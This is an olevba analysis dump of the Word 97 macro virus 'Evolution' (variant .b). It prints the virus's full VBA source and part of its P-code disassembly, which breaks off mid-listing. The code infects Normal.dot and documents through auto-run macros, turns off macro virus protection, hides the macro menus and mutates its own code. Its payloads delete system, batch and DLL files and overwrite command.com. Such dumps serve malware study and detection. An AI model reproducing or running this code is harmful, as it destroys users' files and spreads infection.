olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EVOL.bas 
in file: Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/EVOL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
Public ByeMacro As String
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public PMExport As String
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public FileID2 As String
Public Virname As String
Public FC_There As Boolean
Public FO_There As Boolean
Public FP_There As Boolean
Public FN_There As Boolean
Public FS_There As Boolean
Public FSA_There As Boolean
Public VrusName As String
Public Armor As Boolean
Function Self_Recognition()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\vnames.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
doccheck:
Close #1
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function Armor_Status()
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Export_Code()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
Morph:
Randomize Timer
q = Int(Rnd(1) * 5) + 1
For vi = 1 To q
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.2 Export File ID Morph
Open "C:\windows\system\Export.sys" For Append As #1
Print #1, FileID
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID
Close #1
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Polymorphic_Check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID2 For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
Loop Until EOF(1)
End Function
Function Payload()
On Error Resume Next
'Now we got a nasty little payload....
Check$ = Dir("C:\error1.sys")
If Check$ = "error1.sys" Then Exit Function
Randomize Timer
x = Int(Rnd(1) * 100)
If x = 1 Then
Open "C:\autoexec.bat" For Append As #1
Print #1, "echo Everything must change"
Close #1
End If
If x = 2 Then
Open "C:\command.com" For Output As #1
Print #1, "W97M/Evolution .b!!"
Close #1
End If
If x = 3 Then
Kill "C:\*.sys"
Kill "C:\*.bat"
End If
If x = 50 Then
Kill "C:\windows\system\*.dll"
End If
If x = 25 Then
Open "C:\windows\Control.ini" For Append As #1
Seek #1, 0
Print #1, "[Screen Saver.3DText]"
Print #1, "DemoType = 0"
Print #1, "RotStyle = 3"
Print #1, "Tesselation = 100"
Print #1, "Size = 100"
Print #1, "Speed = 100"
Print #1, "SurfStyle = 0"
Print #1, "Font = Comic Sans MS"
Print #1, "FontAttributes = 0"
Print #1, "Charset = 0"
Print #1, "Text = Evolution"
Print #1, "Texture = None"
Print #1, "TextureFileOffset = 3"
Close #1
End If
If x = 75 Then
' I love this nice little trick for Dr. Solomon
Open "C:\windows\import.exe" For Append As #1
Print #1, "ZQZXJVBVT"
Print #1, "Oops looks like you got a 'virus'"
Close #1
End If
If x = 69 Then
Open "C:\windows\Evolution.bmp" For Append As #1
Print #1, "dedicated to that special little someone.."
Print #1, "She knows who she is..."
Close #1
End If
If x = 83 Then
Open "C:\windows\system\data101.cpl" For Append As #1
Print #1, "Word97 Macro Evolution .b"
Close #1
End If
End Function
Function Evolve()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
'RAPE v1.2 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
PM = Int(Rnd(1) * 150) + 1
If PM = 22 Then
If FC_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call Evolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Evolution"
Print #1, "End sub"
Close #1
End If
If PM = 122 Then
If FN_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
Print #1, "End Sub"
Close #1
End If
If PM = 90 Then
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 8 Then
If FSA_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function Norminf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\vnames.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
Function FileInft()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
End With
Randomize Timer
WD = Int(Rnd(1) * 8) + 2
For evo = 2 To WD
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
VrusName = VrusName + a$
Next evo
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
' RAPE v1.2 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
End Function
Function Evolution()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
Call Armor_Status
Call Export_Code
Call Payload
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
If FileInf = False Then Call FileInft
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
' W97M/Evolution
' W97M/Evolution .b Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error
' RAPE v1.2 does:
' Randomly Morphs Source Code by Adding Random Remarks now even better
' Randomly Selects Source Code Export File - Then Morphs it
' Randomly Creates Virus Macro Name
' Randomly Adds 1 to 6 Commands to Code
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
WordBasic.filesave
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Armor_Status
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Sub
Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
If PMFile_Yes = True Then Exit Sub
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
Print #1, "W97M/Evolution .b by Nex"
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error"
Close #1
Open "C:\windows\system\Export.sys" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
F = Int(Rnd(1) * 999) + 1
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID2 For Append As #4
Do
inpux:
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
    If t = 2 Then Z$ = " '" & Application.UserInitials
    If t = 3 Then Z$ = " '" & Application.UserAddress
    If t = 4 Then Z$ = " '" & Int(Rnd(1) * 9999999) + 1
    If t = 5 Then GoTo inpux
    Print #4, Z$
' Source Code Morpher - adds random remarks to Code (RAPE v1.2 by Error)
Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
Print #5, FileID2
Close #5
End Sub
Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
End Sub
' "The most polymorphic Macro Virus to date...." - NAI
' EOF

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Evolution.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/EVOL - 28405 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Source (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn ByeMacro (As String)
' Line #2:
' 	Dim (Public) 
' 	VarDefn Hostinf (As Boolean)
' Line #3:
' 	Dim (Public) 
' 	VarDefn FileInf (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn FExport (As String)
' Line #5:
' 	Dim (Public) 
' 	VarDefn PMExport (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn PMFile_Yes (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Ex_Yes (As Boolean)
' Line #8:
' 	Dim (Public) 
' 	VarDefn Filename (As String)
' Line #9:
' 	Dim (Public) 
' 	VarDefn FileID (As String)
' Line #10:
' 	Dim (Public) 
' 	VarDefn FileID2 (As String)
' Line #11:
' 	Dim (Public) 
' 	VarDefn Virname (As String)
' Line #12:
' 	Dim (Public) 
' 	VarDefn FC_There (As Boolean)
' Line #13:
' 	Dim (Public) 
' 	VarDefn FO_There (As Boolean)
' Line #14:
' 	Dim (Public) 
' 	VarDefn FP_There (As Boolean)
' Line #15:
' 	Dim (Public) 
' 	VarDefn FN_There (As Boolean)
' Line #16:
' 	Dim (Public) 
' 	VarDefn FS_There (As Boolean)
' Line #17:
' 	Dim (Public) 
' 	VarDefn FSA_There (As Boolean)
' Line #18:
' 	Dim (Public) 
' 	VarDefn VrusName (As String)
' Line #19:
' 	Dim (Public) 
' 	VarDefn Armor (As Boolean)
' Line #20:
' 	FuncDefn (Function Self_Recognition())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #24:
' 	Do 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #26:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #29:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo newname 
' 	EndIf 
' Line #30:
' 	Label newname 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #32:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #37:
' 	Label lost 
' Line #38:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #41:
' 	Dim 
' 	VarDefn Let
' Line #42:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #43:
' 	Do 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #45:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo skip 
' 	EndIf 
' Line #47:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Hostinf 
' 	BoS 0x0000 
' 	GoTo doccheck 
' 	EndIf 
' Line #48:
' 	Label skip 
' Line #49:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #51:
' 	Label doccheck 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #53:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #54:
' 	Do 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #56:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nope 
' 	EndIf 
' Line #58:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FileInf 
' 	BoS 0x0000 
' 	GoTo leave 
' 	EndIf 
' Line #59:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St FileInf 
' 	BoS 0x0000 
' 	EndIf 
' Line #60:
' 	Label nope 
' Line #61:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #63:
' 	LitVarSpecial (False)
' 	St FileInf 
' Line #64:
' 	Label leave 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' 	EndFunc 
' Line #67:
' 	FuncDefn (Function Armor_Status())
' Line #68:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #69:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Armor 
' 	EndIf 
' Line #70:
' 	Label Offense 
' Line #71:
' 	Ld Armor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #72:
' 	LitVarSpecial (False)
' 	St Armor 
' Line #73:
' 	EndFunc 
' Line #74:
' 	FuncDefn (Function Export_Code())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsLd Dir 0x0001 
' 	St FExport 
' Line #78:
' 	Ld FExport 
' 	LitStr 0x000A "Export.sys"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ex_Yes 
' 	EndIf 
' Line #79:
' 	Ld Ex_Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Morph 
' 	Else 
' 	BoSImplicit 
' 	GoTo Recognize 
' 	EndIf 
' Line #80:
' 	Label Morph 
' Line #81:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #82:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St q 
' Line #83:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q 
' 	For 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #85:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #86:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #87:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #88:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #89:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #90:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #91:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #92:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #93:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #94:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #95:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #96:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #97:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #98:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #99:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #100:
